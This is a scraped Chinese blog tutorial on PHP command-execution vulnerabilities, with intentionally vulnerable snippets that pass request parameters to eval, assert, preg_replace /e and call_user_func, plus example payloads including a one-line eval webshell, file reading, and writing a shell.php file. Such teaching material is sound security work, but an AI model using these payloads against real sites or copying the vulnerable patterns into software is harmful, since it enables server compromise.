{"blogid": "123207174", "writerAge": "码龄3年", "writerBlogNum": "33", "writerCollect": "11", "writerComment": "6", "writerFan": "5", "writerGrade": "2级", "writerIntegral": "348", "writerName": "supermeatboy223", "writerProfileAdress": "..\\..\\static\\writer_image\\profile_123207174.jpg", "writerRankTotal": "128859", "writerRankWeekly": "533110", "writerThumb": "13", "writerVisitNum": "31487", "blog_read_count": "5457", "blog_time": "于 2022-03-01 16:06:11 发布", "blog_title": "命令执行漏洞", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"../../static/bootstrap/css/csdnstyle.css\" rel=\"stylesheet\"/>\n<div class=\"htmledit_views\" id=\"content_views\">\n<h1>命令执行定义</h1>\n<p><strong>基本定义<br/> 命令执行漏洞是指攻击者可以随意执行系统命令，分为远程命令执行(远程代码执行）和系统命令执行两类。<br/> 原理<br/> 程序应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec.passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击。</strong><br/>  </p>\n<h1>命令执行条件</h1>\n<p>两个条件<br/> 1.用户能够控制的函数输入<br/> 2.存在可以执行代码或者系统命令的危险函数<br/>  </p>\n<h1>命令执行漏洞产生的原因</h1>\n<p>由于开发人员编写源码时，没有针对代码中可执行的特殊函数入口做过滤，导致客户端可以提交恶意构造语句，并提交服务端执行<br/> 命令注入攻击中，Web服务器没有过滤类似system、eval和exec等函数，是该漏洞攻击成功的主要原因。</p>\n<h1>命令执行漏洞带来的危害</h1>\n<p>1.继承Web服务程序的权限去执行系统命令(任意代码)或读写文件</p>\n<p>2.反弹shell</p>\n<p>3.控制整个网站甚至控制服务器进一步内网渗透</p>\n<h1>管道符号和通用命令符</h1>\n<p>管道符号<br/> Linux<br/><strong>；</strong>前面的执行完执行后面的</p>\n<p><strong>|</strong>是管道符，显示后面的执行结果</p>\n<p>||当前面的执行出错时执行后面的<br/> Windows<br/> &amp;前面的语句为假则直接执行后面的</p>\n<p>&amp;&amp;前面的语句为假则直接出错，后面的也不执行</p>\n<p>|直接执行后面的语句</p>\n<p>ll前面出错执行后面的</p>\n<h1>通用命令符</h1>\n<p>command1 &amp;&amp; command2                //command1执行成功才执行command2<br/> command1 | command2                //只执行command2<br/> command1 &amp; command2                //command1和command2之间互相不影响</p>\n<h1>远程命令执行漏洞相关函数</h1>\n<p>在PHP下，允许命令执行的函数有:</p>\n<pre><code>eval()\n\nassert()\n\npreg_replace()\n\ncall_user_func()\n\n$a($b)</code></pre>\n<p>如果页面中存在这些函数并且对于用户的输入没有做严格的过滤，那么就可能造成远程命令执行漏洞。</p>\n<h1>eval()<br/><img alt=\"\" height=\"338\" src=\"..\\..\\static\\image\\0709fb2b09444a319813d0a7b92b8591.png\" width=\"677\"/></h1>\n<p> </p>\n<pre><code>&lt;?php\nif(isset($_GET['a'])){\n\teval($_GET['a']);\t\n}\nelse{\n\techo \"Please input a\";\n}\n?&gt;</code></pre>\n<p>payload eval.php?a=phpinfo();<img alt=\"\" height=\"235\" src=\"..\\..\\static\\image\\b77cf539d22d42da9742af292d8b2092.png\" width=\"736\"/></p>\n<h1> assert()<img alt=\"\" height=\"227\" src=\"..\\..\\static\\image\\410ea0c2b9654921afbc5017b3c9d380.png\" width=\"629\"/></h1>\n<pre><code>&lt;?php\nif(isset($_GET['a'])){\n\tassert($_GET['a']);\t\n}\nelse{\n\techo \"Please input a\";\n}\n?&gt;</code></pre>\n<p>payload  assert.php?a=phpinfo()</p>\n<p><img alt=\"\" height=\"204\" src=\"..\\..\\static\\image\\c9e8e4f76a4e49fcb295b1a482da8222.png\" width=\"670\"/></p>\n<h1> preg_replace()</h1>\n<p><img alt=\"\" height=\"258\" src=\"..\\..\\static\\image\\60d64c2dd7ba4ed8b70b5d7f5753bd33.png\" width=\"626\"/></p>\n<pre><code>&lt;?php\nif(isset($_GET['a'])){\n\t//Preg_replace(\"/\\[(.*)\\]/e\",'\\\\1',$_GET['a']);\t\n\tPreg_replace(\"/(.*)/e\",'\\\\1',$_GET['a']);\n}\nelse{\n\techo \"Please input a\";\n}\n?&gt;\n\n</code></pre>\n<p>payload   preg_replace.php?a=phpinfo()<img alt=\"\" height=\"224\" src=\"..\\..\\static\\image\\f9235b0359a14459b76c68b9e1a82ded.png\" width=\"634\"/></p>\n<h1> call_user_func()<img alt=\"\" height=\"358\" src=\"..\\..\\static\\image\\d5f43deacb9b40daab3fe10a2d89d99d.png\" width=\"557\"/></h1>\n<pre><code>&lt;?php\nif(isset($_GET['a'])){\n\tcall_user_func($_GET['a'],$_GET['b']);\n}\nelse{\n\techo \"Please input a\";\n}\n?&gt;</code></pre>\n<p> payload  call_user_func.php?a=assert&amp;b=phpinfo()<img alt=\"\" height=\"265\" src=\"..\\..\\static\\image\\11eeb7126f6245c2a94aa46ba41a3176.png\" width=\"652\"/></p>\n<p></p>\n<h1>远程命令执行漏洞的利用</h1>\n<p>远程命令执行漏洞有以下一些利用方式:</p>\n<p>?a=@eval($_POST[666]);   //—句话木马<br/> ?a=print(_FILE_);                //获取当前绝对路径<br/> ?a=var_dump(file_get_contents('c\\windows\\system32\\drivers\\etc\\hosts'));                //读取文件<br/> ?a=var_dump(file_put_contents($_POST[1],$_POST[2]));<br/> 1 =shell.php&amp;2=&lt;?php phpinfo()?&gt;                        //写shell</p>\n<p></p>\n</div>\n</div>", "first_tag": "PHP", "cpp": 0, "csharp": 0, "python": 0, "javascript": 0, "java": 0, "sql": 0, "php": 1, "time": "2022-03-01 16:06:11", "summary": "命令执行定义基本定义命令执行漏洞是指攻击者可以随意执行系统命令，分为远程命令执行远程代码执行和系统命令执行两类。原理程序应用有时需要调用一些执行系统命令的函数，如中的、、、、等，当用户能控制这些函数中"}